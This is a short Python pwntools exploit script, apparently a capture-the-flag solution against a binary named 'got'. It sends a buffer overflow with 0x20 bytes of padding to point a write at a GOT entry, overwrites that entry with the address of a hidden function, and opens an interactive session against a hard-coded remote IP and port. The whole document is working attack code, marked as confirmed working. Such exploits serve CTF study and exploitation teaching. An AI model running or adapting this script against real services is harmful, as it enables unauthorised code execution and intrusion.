# This code works (2023-11-23)
from pwn import *

context.log_level = "debug"
p = remote('141.164.48.98', '30006')
#p = process("./got")

payload1 = b"A" * 0x20
payload1 += (0x4005D0 + 0x200A52 + 0x6).to_bytes(8, "little")  # (void *), qword ptr [rip + 0x200a52]
payload2 = f"{0x400748 + 100}".encode()  # (long long), hidden function

# pause()
p.sendlineafter("name?\n", payload1)
# pause()
p.sendlineafter("score?\n", payload2)
p.interactive()
